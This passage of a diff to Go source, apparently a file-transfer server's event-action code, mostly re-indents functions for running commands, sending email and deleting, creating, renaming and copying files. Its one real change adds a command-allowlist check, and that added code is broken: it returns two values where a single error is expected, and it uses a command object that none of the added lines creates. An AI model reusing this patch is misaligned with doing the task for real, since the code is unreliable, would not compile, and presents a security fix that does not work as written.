os.Getenv(keyVal.Key)\n-\t\t\tif val == \"\" {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"empty value for environment variable %q\", keyVal.Key)\n-\t\t\t}\n-\t\t\tcmd.Env = append(cmd.Env, fmt.Sprintf(\"%s=%s\", keyVal.Key, val))\n-\t\t} else {\n-\t\t\tcmd.Env = append(cmd.Env, fmt.Sprintf(\"%s=%s\", keyVal.Key, replaceWithReplacer(keyVal.Value, replacer)))\n-\t\t}\n-\t}\n-\n-\tstartTime := time.Now()\n-\terr := cmd.Run()\n-\n-\teventManagerLog(logger.LevelDebug, \"executed command %q, elapsed: %s, error: %v\",\n-\t\tc.Cmd, time.Since(startTime), err)\n-\n-\treturn err\n+        addObjectData := false\n+        if params.Object != nil {\n+                for _, k := range c.EnvVars {\n+                        if strings.Contains(k.Value, objDataPlaceholder) || strings.Contains(k.Value, objDataPlaceholderString) {\n+                                addObjectData = true\n+                                break\n+                        }\n+                }\n+        }\n+        replacements := params.getStringReplacements(addObjectData, false)\n+        replacer := strings.NewReplacer(replacements...)\n+\n+        args := make([]string, 0, len(c.Args))\n+        for _, arg := range c.Args {\n+                args = append(args, replaceWithReplacer(arg, replacer))\n+        }\n+\n+        ctx, cancel := context.WithTimeout(context.Background(), time.Duration(c.Timeout)*time.Second)\n+        defer cancel()\n+\n+        if !IsCommandAllowed(c.Cmd, Config.Actions.AllowedCommands) {\n+return \"\", fmt.Errorf(\"command %q is not allowed\", c.Cmd)\n+}\n+        cmd.Env = []string{}\n+        for _, keyVal := range c.EnvVars {\n+                if keyVal.Value == \"$\" {\n+                        val := os.Getenv(keyVal.Key)\n+                        if val == \"\" {\n+                                eventManagerLog(logger.LevelDebug, \"empty value for environment variable %q\", keyVal.Key)\n+                        }\n+                        cmd.Env = append(cmd.Env, fmt.Sprintf(\"%s=%s\", keyVal.Key, val))\n+                } else {\n+                        cmd.Env = append(cmd.Env, fmt.Sprintf(\"%s=%s\", keyVal.Key, replaceWithReplacer(keyVal.Value, replacer)))\n+                }\n+        }\n+\n+        startTime := time.Now()\n+        err := cmd.Run()\n+\n+        eventManagerLog(logger.LevelDebug, \"executed command %q, elapsed: %s, error: %v\",\n+                c.Cmd, time.Since(startTime), err)\n+\n+        return err\n }\n \n func getEmailAddressesWithReplacer(addrs []string, replacer *strings.Replacer) []string {\n-\tif len(addrs) == 0 {\n-\t\treturn nil\n-\t}\n-\trecipients := make([]string, 0, len(addrs))\n-\tfor _, recipient := range addrs {\n-\t\trcpt := replaceWithReplacer(recipient, replacer)\n-\t\tif rcpt != \"\" {\n-\t\t\trecipients = append(recipients, rcpt)\n-\t\t}\n-\t}\n-\treturn recipients\n+        if len(addrs) == 0 {\n+                return nil\n+        }\n+        recipients := make([]string, 0, len(addrs))\n+        for _, recipient := range addrs {\n+                rcpt := replaceWithReplacer(recipient, replacer)\n+                if rcpt != \"\" {\n+                        recipients = append(recipients, rcpt)\n+                }\n+        }\n+        return recipients\n }\n \n func executeEmailRuleAction(c dataprovider.EventActionEmailConfig, params *EventParams) error {\n-\taddObjectData := false\n-\tif params.Object != nil {\n-\t\tif strings.Contains(c.Body, objDataPlaceholder) || strings.Contains(c.Body, objDataPlaceholderString) {\n-\t\t\taddObjectData = true\n-\t\t}\n-\t}\n-\treplacements := params.getStringReplacements(addObjectData, false)\n-\treplacer := strings.NewReplacer(replacements...)\n-\tbody := replaceWithReplacer(c.Body, replacer)\n-\tsubject := replaceWithReplacer(c.Subject, replacer)\n-\trecipients := getEmailAddressesWithReplacer(c.Recipients, replacer)\n-\tbcc := getEmailAddressesWithReplacer(c.Bcc, replacer)\n-\tstartTime := time.Now()\n-\tvar files []*mail.File\n-\tfileAttachments := make([]string, 0, len(c.Attachments))\n-\tfor _, attachment := range c.Attachments {\n-\t\tif attachment == dataprovider.RetentionReportPlaceHolder {\n-\t\t\tf, err := params.getRetentionReportsAsMailAttachment()\n-\t\t\tif err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t\tfiles = append(files, f)\n-\t\t\tcontinue\n-\t\t}\n-\t\tfileAttachments = append(fileAttachments, attachment)\n-\t}\n-\tif len(fileAttachments) > 0 {\n-\t\tuser, err := params.getUserFromSender()\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tuser, err = getUserForEventAction(user)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tconnectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n-\t\terr = user.CheckFsRoot(connectionID)\n-\t\tdefer user.CloseFs() //nolint:errcheck\n-\t\tif err != nil {\n-\t\t\treturn fmt.Errorf(\"error getting email attachments, unable to check root fs for user %q: %w\", user.Username, err)\n-\t\t}\n-\t\tconn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n-\t\tres, err := getMailAttachments(conn, fileAttachments, replacer)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tfiles = append(files, res...)\n-\t}\n-\terr := smtp.SendEmail(recipients, bcc, subject, body, smtp.EmailContentType(c.ContentType), files...)\n-\teventManagerLog(logger.LevelDebug, \"executed email notification action, elapsed: %s, error: %v\",\n-\t\ttime.Since(startTime), err)\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to send email: %w\", err)\n-\t}\n-\treturn nil\n+        addObjectData := false\n+        if params.Object != nil {\n+                if strings.Contains(c.Body, objDataPlaceholder) || strings.Contains(c.Body, objDataPlaceholderString) {\n+                        addObjectData = true\n+                }\n+        }\n+        replacements := params.getStringReplacements(addObjectData, false)\n+        replacer := strings.NewReplacer(replacements...)\n+        body := replaceWithReplacer(c.Body, replacer)\n+        subject := replaceWithReplacer(c.Subject, replacer)\n+        recipients := getEmailAddressesWithReplacer(c.Recipients, replacer)\n+        bcc := getEmailAddressesWithReplacer(c.Bcc, replacer)\n+        startTime := time.Now()\n+        var files []*mail.File\n+        fileAttachments := make([]string, 0, len(c.Attachments))\n+        for _, attachment := range c.Attachments {\n+                if attachment == dataprovider.RetentionReportPlaceHolder {\n+                        f, err := params.getRetentionReportsAsMailAttachment()\n+                        if err != nil {\n+                                return err\n+                        }\n+                        files = append(files, f)\n+                        continue\n+                }\n+                fileAttachments = append(fileAttachments, attachment)\n+        }\n+        if len(fileAttachments) > 0 {\n+                user, err := params.getUserFromSender()\n+                if err != nil {\n+                        return err\n+                }\n+                user, err = getUserForEventAction(user)\n+                if err != nil {\n+                        return err\n+                }\n+                connectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n+                err = user.CheckFsRoot(connectionID)\n+                defer user.CloseFs() //nolint:errcheck\n+                if err != nil {\n+                        return fmt.Errorf(\"error getting email attachments, unable to check root fs for user %q: %w\", user.Username, err)\n+                }\n+                conn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n+                res, err := getMailAttachments(conn, fileAttachments, replacer)\n+                if err != nil {\n+                        return err\n+                }\n+                files = append(files, res...)\n+        }\n+        err := smtp.SendEmail(recipients, bcc, subject, body, smtp.EmailContentType(c.ContentType), files...)\n+        eventManagerLog(logger.LevelDebug, \"executed email notification action, elapsed: %s, error: %v\",\n+                time.Since(startTime), err)\n+        if err != nil {\n+                return fmt.Errorf(\"unable to send email: %w\", err)\n+        }\n+        return nil\n }\n \n func getUserForEventAction(user dataprovider.User) (dataprovider.User, error) {\n-\terr := user.LoadAndApplyGroupSettings()\n-\tif err != nil {\n-\t\teventManagerLog(logger.LevelError, \"unable to get group for user %q: %+v\", user.Username, err)\n-\t\treturn dataprovider.User{}, fmt.Errorf(\"unable to get groups for user %q\", user.Username)\n-\t}\n-\tuser.UploadDataTransfer = 0\n-\tuser.UploadBandwidth = 0\n-\tuser.DownloadBandwidth = 0\n-\tuser.Filters.DisableFsChecks = false\n-\tuser.Filters.FilePatterns = nil\n-\tuser.Filters.BandwidthLimits = nil\n-\tfor k := range user.Permissions {\n-\t\tuser.Permissions[k] = []string{dataprovider.PermAny}\n-\t}\n-\treturn user, nil\n+        err := user.LoadAndApplyGroupSettings()\n+        if err != nil {\n+                eventManagerLog(logger.LevelError, \"unable to get group for user %q: %+v\", user.Username, err)\n+                return dataprovider.User{}, fmt.Errorf(\"unable to get groups for user %q\", user.Username)\n+        }\n+        user.UploadDataTransfer = 0\n+        user.UploadBandwidth = 0\n+        user.DownloadBandwidth = 0\n+        user.Filters.DisableFsChecks = false\n+        user.Filters.FilePatterns = nil\n+        user.Filters.BandwidthLimits = nil\n+        for k := range user.Permissions {\n+                user.Permissions[k] = []string{dataprovider.PermAny}\n+        }\n+        return user, nil\n }\n \n func replacePathsPlaceholders(paths []string, replacer *strings.Replacer) []string {\n-\tresults := make([]string, 0, len(paths))\n-\tfor _, p := range paths {\n-\t\tresults = append(results, util.CleanPath(replaceWithReplacer(p, replacer)))\n-\t}\n-\treturn util.RemoveDuplicates(results, false)\n+        results := make([]string, 0, len(paths))\n+        for _, p := range paths {\n+                results = append(results, util.CleanPath(replaceWithReplacer(p, replacer)))\n+        }\n+        return util.RemoveDuplicates(results, false)\n }\n \n func executeDeleteFileFsAction(conn *BaseConnection, item string, info os.FileInfo) error {\n-\tfs, fsPath, err := conn.GetFsAndResolvedPath(item)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\treturn conn.RemoveFile(fs, fsPath, item, info)\n+        fs, fsPath, err := conn.GetFsAndResolvedPath(item)\n+        if err != nil {\n+                return err\n+        }\n+        return conn.RemoveFile(fs, fsPath, item, info)\n }\n \n func executeDeleteFsActionForUser(deletes []string, replacer *strings.Replacer, user dataprovider.User) error {\n-\tuser, err := getUserForEventAction(user)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tconnectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n-\terr = user.CheckFsRoot(connectionID)\n-\tdefer user.CloseFs() //nolint:errcheck\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"delete error, unable to check root fs for user %q: %w\", user.Username, err)\n-\t}\n-\tconn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n-\tfor _, item := range replacePathsPlaceholders(deletes, replacer) {\n-\t\tinfo, err := conn.DoStat(item, 0, false)\n-\t\tif err != nil {\n-\t\t\tif conn.IsNotExistError(err) {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t\treturn fmt.Errorf(\"unable to check item to delete %q, user %q: %w\", item, user.Username, err)\n-\t\t}\n-\t\tif info.IsDir() {\n-\t\t\tif err = conn.RemoveDir(item); err != nil {\n-\t\t\t\treturn fmt.Errorf(\"unable to remove dir %q, user %q: %w\", item, user.Username, err)\n-\t\t\t}\n-\t\t} else {\n-\t\t\tif err = executeDeleteFileFsAction(conn, item, info); err != nil {\n-\t\t\t\treturn fmt.Errorf(\"unable to remove file %q, user %q: %w\", item, user.Username, err)\n-\t\t\t}\n-\t\t}\n-\t\teventManagerLog(logger.LevelDebug, \"item %q removed for user %q\", item, user.Username)\n-\t}\n-\treturn nil\n+        user, err := getUserForEventAction(user)\n+        if err != nil {\n+                return err\n+        }\n+        connectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n+        err = user.CheckFsRoot(connectionID)\n+        defer user.CloseFs() //nolint:errcheck\n+        if err != nil {\n+                return fmt.Errorf(\"delete error, unable to check root fs for user %q: %w\", user.Username, err)\n+        }\n+        conn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n+        for _, item := range replacePathsPlaceholders(deletes, replacer) {\n+                info, err := conn.DoStat(item, 0, false)\n+                if err != nil {\n+                        if conn.IsNotExistError(err) {\n+                                continue\n+                        }\n+                        return fmt.Errorf(\"unable to check item to delete %q, user %q: %w\", item, user.Username, err)\n+                }\n+                if info.IsDir() {\n+                        if err = conn.RemoveDir(item); err != nil {\n+                                return fmt.Errorf(\"unable to remove dir %q, user %q: %w\", item, user.Username, err)\n+                        }\n+                } else {\n+                        if err = executeDeleteFileFsAction(conn, item, info); err != nil {\n+                                return fmt.Errorf(\"unable to remove file %q, user %q: %w\", item, user.Username, err)\n+                        }\n+                }\n+                eventManagerLog(logger.LevelDebug, \"item %q removed for user %q\", item, user.Username)\n+        }\n+        return nil\n }\n \n func executeDeleteFsRuleAction(deletes []string, replacer *strings.Replacer,\n-\tconditions dataprovider.ConditionOptions, params *EventParams,\n+        conditions dataprovider.ConditionOptions, params *EventParams,\n ) error {\n-\tusers, err := params.getUsers()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get users: %w\", err)\n-\t}\n-\tvar failures []string\n-\texecuted := 0\n-\tfor _, user := range users {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" {\n-\t\t\tif !checkUserConditionOptions(&user, &conditions) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"skipping fs delete for user %s, condition options don't match\",\n-\t\t\t\t\tuser.Username)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\texecuted++\n-\t\tif err = executeDeleteFsActionForUser(deletes, replacer, user); err != nil {\n-\t\t\tparams.AddError(err)\n-\t\t\tfailures = append(failures, user.Username)\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"fs delete failed for users: %s\", strings.Join(failures, \", \"))\n-\t}\n-\tif executed == 0 {\n-\t\teventManagerLog(logger.LevelError, \"no delete executed\")\n-\t\treturn errors.New(\"no delete executed\")\n-\t}\n-\treturn nil\n+        users, err := params.getUsers()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get users: %w\", err)\n+        }\n+        var failures []string\n+        executed := 0\n+        for _, user := range users {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" {\n+                        if !checkUserConditionOptions(&user, &conditions) {\n+                                eventManagerLog(logger.LevelDebug, \"skipping fs delete for user %s, condition options don't match\",\n+                                        user.Username)\n+                                continue\n+                        }\n+                }\n+                executed++\n+                if err = executeDeleteFsActionForUser(deletes, replacer, user); err != nil {\n+                        params.AddError(err)\n+                        failures = append(failures, user.Username)\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"fs delete failed for users: %s\", strings.Join(failures, \", \"))\n+        }\n+        if executed == 0 {\n+                eventManagerLog(logger.LevelError, \"no delete executed\")\n+                return errors.New(\"no delete executed\")\n+        }\n+        return nil\n }\n \n func executeMkDirsFsActionForUser(dirs []string, replacer *strings.Replacer, user dataprovider.User) error {\n-\tuser, err := getUserForEventAction(user)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tconnectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n-\terr = user.CheckFsRoot(connectionID)\n-\tdefer user.CloseFs() //nolint:errcheck\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"mkdir error, unable to check root fs for user %q: %w\", user.Username, err)\n-\t}\n-\tconn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n-\tfor _, item := range replacePathsPlaceholders(dirs, replacer) {\n-\t\tif err = conn.CheckParentDirs(path.Dir(item)); err != nil {\n-\t\t\treturn fmt.Errorf(\"unable to check parent dirs for %q, user %q: %w\", item, user.Username, err)\n-\t\t}\n-\t\tif err = conn.createDirIfMissing(item); err != nil {\n-\t\t\treturn fmt.Errorf(\"unable to create dir %q, user %q: %w\", item, user.Username, err)\n-\t\t}\n-\t\teventManagerLog(logger.LevelDebug, \"directory %q created for user %q\", item, user.Username)\n-\t}\n-\treturn nil\n+        user, err := getUserForEventAction(user)\n+        if err != nil {\n+                return err\n+        }\n+        connectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n+        err = user.CheckFsRoot(connectionID)\n+        defer user.CloseFs() //nolint:errcheck\n+        if err != nil {\n+                return fmt.Errorf(\"mkdir error, unable to check root fs for user %q: %w\", user.Username, err)\n+        }\n+        conn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n+        for _, item := range replacePathsPlaceholders(dirs, replacer) {\n+                if err = conn.CheckParentDirs(path.Dir(item)); err != nil {\n+                        return fmt.Errorf(\"unable to check parent dirs for %q, user %q: %w\", item, user.Username, err)\n+                }\n+                if err = conn.createDirIfMissing(item); err != nil {\n+                        return fmt.Errorf(\"unable to create dir %q, user %q: %w\", item, user.Username, err)\n+                }\n+                eventManagerLog(logger.LevelDebug, \"directory %q created for user %q\", item, user.Username)\n+        }\n+        return nil\n }\n \n func executeMkdirFsRuleAction(dirs []string, replacer *strings.Replacer,\n-\tconditions dataprovider.ConditionOptions, params *EventParams,\n+        conditions dataprovider.ConditionOptions, params *EventParams,\n ) error {\n-\tusers, err := params.getUsers()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get users: %w\", err)\n-\t}\n-\tvar failures []string\n-\texecuted := 0\n-\tfor _, user := range users {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" {\n-\t\t\tif !checkUserConditionOptions(&user, &conditions) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"skipping fs mkdir for user %s, condition options don't match\",\n-\t\t\t\t\tuser.Username)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\texecuted++\n-\t\tif err = executeMkDirsFsActionForUser(dirs, replacer, user); err != nil {\n-\t\t\tfailures = append(failures, user.Username)\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"fs mkdir failed for users: %s\", strings.Join(failures, \", \"))\n-\t}\n-\tif executed == 0 {\n-\t\teventManagerLog(logger.LevelError, \"no mkdir executed\")\n-\t\treturn errors.New(\"no mkdir executed\")\n-\t}\n-\treturn nil\n+        users, err := params.getUsers()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get users: %w\", err)\n+        }\n+        var failures []string\n+        executed := 0\n+        for _, user := range users {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" {\n+                        if !checkUserConditionOptions(&user, &conditions) {\n+                                eventManagerLog(logger.LevelDebug, \"skipping fs mkdir for user %s, condition options don't match\",\n+                                        user.Username)\n+                                continue\n+                        }\n+                }\n+                executed++\n+                if err = executeMkDirsFsActionForUser(dirs, replacer, user); err != nil {\n+                        failures = append(failures, user.Username)\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"fs mkdir failed for users: %s\", strings.Join(failures, \", \"))\n+        }\n+        if executed == 0 {\n+                eventManagerLog(logger.LevelError, \"no mkdir executed\")\n+                return errors.New(\"no mkdir executed\")\n+        }\n+        return nil\n }\n \n func executeRenameFsActionForUser(renames []dataprovider.RenameConfig, replacer *strings.Replacer,\n-\tuser dataprovider.User,\n+        user dataprovider.User,\n ) error {\n-\tuser, err := getUserForEventAction(user)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tconnectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n-\terr = user.CheckFsRoot(connectionID)\n-\tdefer user.CloseFs() //nolint:errcheck\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"rename error, unable to check root fs for user %q: %w\", user.Username, err)\n-\t}\n-\tconn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n-\tfor _, item := range renames {\n-\t\tsource := util.CleanPath(replaceWithReplacer(item.Key, replacer))\n-\t\ttarget := util.CleanPath(replaceWithReplacer(item.Value, replacer))\n-\t\tchecks := 0\n-\t\tif item.UpdateModTime {\n-\t\t\tchecks += vfs.CheckUpdateModTime\n-\t\t}\n-\t\tif err = conn.renameInternal(source, target, true, checks); err != nil {\n-\t\t\treturn fmt.Errorf(\"unable to rename %q->%q, user %q: %w\", source, target, user.Username, err)\n-\t\t}\n-\t\teventManagerLog(logger.LevelDebug, \"rename %q->%q ok, user %q\", source, target, user.Username)\n-\t}\n-\treturn nil\n+        user, err := getUserForEventAction(user)\n+        if err != nil {\n+                return err\n+        }\n+        connectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n+        err = user.CheckFsRoot(connectionID)\n+        defer user.CloseFs() //nolint:errcheck\n+        if err != nil {\n+                return fmt.Errorf(\"rename error, unable to check root fs for user %q: %w\", user.Username, err)\n+        }\n+        conn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n+        for _, item := range renames {\n+                source := util.CleanPath(replaceWithReplacer(item.Key, replacer))\n+                target := util.CleanPath(replaceWithReplacer(item.Value, replacer))\n+                checks := 0\n+                if item.UpdateModTime {\n+                        checks += vfs.CheckUpdateModTime\n+                }\n+                if err = conn.renameInternal(source, target, true, checks); err != nil {\n+                        return fmt.Errorf(\"unable to rename %q->%q, user %q: %w\", source, target, user.Username, err)\n+                }\n+                eventManagerLog(logger.LevelDebug, \"rename %q->%q ok, user %q\", source, target, user.Username)\n+        }\n+        return nil\n }\n \n func executeCopyFsActionForUser(copy []dataprovider.KeyValue, replacer *strings.Replacer,\n-\tuser dataprovider.User,\n+        user dataprovider.User,\n ) error {\n-\tuser, err := getUserForEventAction(user)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tconnectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n-\terr = user.CheckFsRoot(connectionID)\n-\tdefer user.CloseFs() //nolint:errcheck\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"copy error, unable to check root fs for user %q: %w\", user.Username, err)\n-\t}\n-\tconn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n-\tfor _, item := range copy {\n-\t\tsource := util.CleanPath(replaceWithReplacer(item.Key, replacer))\n-\t\ttarget := util.CleanPath(replaceWithReplacer(item.Value, replacer))\n-\t\tif strings.HasSuffix(item.Key, \"/\") {\n-\t\t\tsource += \"/\"\n-\t\t}\n-\t\tif strings.HasSuffix(item.Value, \"/\") {\n-\t\t\ttarget += \"/\"\n-\t\t}\n-\t\tif err = conn.Copy(source, target); err != nil {\n-\t\t\treturn fmt.Errorf(\"unable to copy %q->%q, user %q: %w\", source, target, user.Username, err)\n-\t\t}\n-\t\teventManagerLog(logger.LevelDebug, \"copy %q->%q ok, user %q\", source, target, user.Username)\n-\t}\n-\treturn nil\n+        user, err := getUserForEventAction(user)\n+        if err != nil {\n+                return err\n+        }\n+        connectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n+        err = user.CheckFsRoot(connectionID)\n+        defer user.CloseFs() //nolint:errcheck\n+        if err != nil {\n+                return fmt.Errorf(\"copy error, unable to check root fs for user %q: %w\", user.Username, err)\n+        }\n+        conn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n+        for _, item := range copy {\n+                source := util.CleanPath(replaceWithReplacer(item.Key, replacer))\n+                target := util.CleanPath(replaceWithReplacer(item.Value, replacer))\n+                if strings.HasSuffix(item.Key, \"/\") {\n+                        source += \"/\"\n+                }\n+                if strings.HasSuffix(item.Value, \"/\") {\n+                        target += \"/\"\n+                }\n+                if err = conn.Copy(source, target); err != nil {\n+                        return fmt.Errorf(\"unable to copy %q->%q, user %q: %w\", source, target, user.Username, err)\n+                }\n+                eventManagerLog(logger.LevelDebug, \"copy %q->%q ok, user %q\", source, target, user.Username)\n+        }\n+        return nil\n }\n \n func executeExistFsActionForUser(exist []string, replacer *strings.Replacer,\n-\tuser dataprovider.User,\n+        user dataprovider.User,\n ) error {\n-\tuser, err := getUserForEventAction(user)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tconnectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n-\terr = user.CheckFsRoot(connectionID)\n-\tdefer user.CloseFs() //nolint:errcheck\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"existence check error, unable to check root fs for user %q: %w\", user.Username, err)\n-\t}\n-\tconn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n-\tfor _, item := range replacePathsPlaceholders(exist, replacer) {\n-\t\tif _, err = conn.DoStat(item, 0, false); err != nil {\n-\t\t\treturn fmt.Errorf(\"error checking existence for path %q, user %q: %w\", item, user.Username, err)\n-\t\t}\n-\t\teventManagerLog(logger.LevelDebug, \"path %q exists for user %q\", item, user.Username)\n-\t}\n-\treturn nil\n+        user, err := getUserForEventAction(user)\n+        if err != nil {\n+                return err\n+        }\n+        connectionID := fmt.Sprintf(\"%s_%s\", protocolEventAction, xid.New().String())\n+        err = user.CheckFsRoot(connectionID)\n+        defer user.CloseFs() //nolint:errcheck\n+        if err != nil {\n+                return fmt.Errorf(\"existence check error, unable to check root fs for user %q: %w\", user.Username, err)\n+        }\n+        conn := NewBaseConnection(connectionID, protocolEventAction, \"\", \"\", user)\n+        for _, item := range replacePathsPlaceholders(exist, replacer) {\n+                if _, err = conn.DoStat(item, 0, false); err != nil {\n+                        return fmt.Errorf(\"error checking existence for path %q, user %q: %w\", item, user.Username, err)\n+                }\n+                eventManagerLog(logger.LevelDebug, \"path %q exists for user %q\", item, user.Username)\n+        }\n+        return nil\n }\n \n func executeRenameFsRuleAction(renames []dataprovider.RenameConfig, replacer *strings.Replacer,\n-\tconditions dataprovider.ConditionOptions, params *EventParams,\n+        conditions dataprovider.ConditionOptions, params *EventParams,\n ) error {\n-\tusers, err := params.getUsers()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get users: %w\", err)\n-\t}\n-\tvar failures []string\n-\texecuted := 0\n-\tfor _, user := range users {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" {\n-\t\t\tif !checkUserConditionOptions(&user, &conditions) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"skipping fs rename for user %s, condition options don't match\",\n-\t\t\t\t\tuser.Username)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\texecuted++\n-\t\tif err = executeRenameFsActionForUser(renames, replacer, user); err != nil {\n-\t\t\tfailures = append(failures, user.Username)\n-\t\t\tparams.AddError(err)\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"fs rename failed for users: %s\", strings.Join(failures, \", \"))\n-\t}\n-\tif executed == 0 {\n-\t\teventManagerLog(logger.LevelError, \"no rename executed\")\n-\t\treturn errors.New(\"no rename executed\")\n-\t}\n-\treturn nil\n+        users, err := params.getUsers()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get users: %w\", err)\n+        }\n+        var failures []string\n+        executed := 0\n+        for _, user := range users {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" {\n+                        if !checkUserConditionOptions(&user, &conditions) {\n+                                eventManagerLog(logger.LevelDebug, \"skipping fs rename for user %s, condition options don't match\",\n+                                        user.Username)\n+                                continue\n+                        }\n+                }\n+                executed++\n+                if err = executeRenameFsActionForUser(renames, replacer, user); err != nil {\n+                        failures = append(failures, user.Username)\n+                        params.AddError(err)\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"fs rename failed for users: %s\", strings.Join(failures, \", \"))\n+        }\n+        if executed == 0 {\n+                eventManagerLog(logger.LevelError, \"no rename executed\")\n+                return errors.New(\"no rename executed\")\n+        }\n+        return nil\n }\n \n func executeCopyFsRuleAction(copy []dataprovider.KeyValue, replacer *strings.Replacer,\n-\tconditions dataprovider.ConditionOptions, params *EventParams,\n+        conditions dataprovider.ConditionOptions, params *EventParams,\n ) error {\n-\tusers, err := params.getUsers()\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"unable to get users: %w\", err)\n-\t}\n-\tvar failures []string\n-\tvar executed int\n-\tfor _, user := range users {\n-\t\t// if sender is set, the conditions have already been evaluated\n-\t\tif params.sender == \"\" {\n-\t\t\tif !checkUserConditionOptions(&user, &conditions) {\n-\t\t\t\teventManagerLog(logger.LevelDebug, \"skipping fs copy for user %s, condition options don't match\",\n-\t\t\t\t\tuser.Username)\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t}\n-\t\texecuted++\n-\t\tif err = executeCopyFsActionForUser(copy, replacer, user); err != nil {\n-\t\t\tfailures = append(failures, user.Username)\n-\t\t\tparams.AddError(err)\n-\t\t}\n-\t}\n-\tif len(failures) > 0 {\n-\t\treturn fmt.Errorf(\"fs copy failed for users: %s\", strings.Join(failures, \", \"))\n-\t}\n-\tif executed == 0 {\n-\t\teventManagerLog(logger.LevelError, \"no copy executed\")\n-\t\treturn errors.New(\"no copy executed\")\n-\t}\n-\treturn nil\n+        users, err := params.getUsers()\n+        if err != nil {\n+                return fmt.Errorf(\"unable to get users: %w\", err)\n+        }\n+        var failures []string\n+        var executed int\n+        for _, user := range users {\n+                // if sender is set, the conditions have already been evaluated\n+                if params.sender == \"\" {\n+                        if !checkUserConditionOptions(&user, &conditions) {\n+                                eventManagerLog(logger.LevelDebug, \"skipping fs copy for user %s, condition options don't match\",\n+                                        user.Username)\n+                                continue\n+                        }\n+                }\n+                executed++\n+                if err = executeCopyFsActionForUser(copy, replacer, user); err != nil {\n+                        failures = append(failures, user.Username)\n+                        params.AddError(err)\n+                }\n+        }\n+        if len(failures) > 0 {\n+                return fmt.Errorf(\"fs copy failed for users: %s\", strings.Join(failures, \", \"))\n+        }\n+        if executed == 0 {\n+                eventManagerLog(logger.LevelError, \"no copy executed\")\n+                return errors.New(\"no copy executed\")\n+        }\n+        return nil\n }\n \n func getArchiveBaseDir(paths []string) string {\n-\tvar parentDirs []string\n-\tfor _, p := range paths {\n-\t\tparentDirs = append(parentDirs, path.Dir(p))\n-\t}\n-\tparentDirs = util.RemoveDuplicates(parentDirs, false)\n-\tbaseDir := \"/\"\n-\tif len(parentDirs) == 1 {\n-\t\tbaseDir = parentDirs[0]\n-\t}\n-\treturn baseDir\n+        var parentDirs []string\n+        for _, p := range paths {\n+                parentDirs = append(parentDirs, 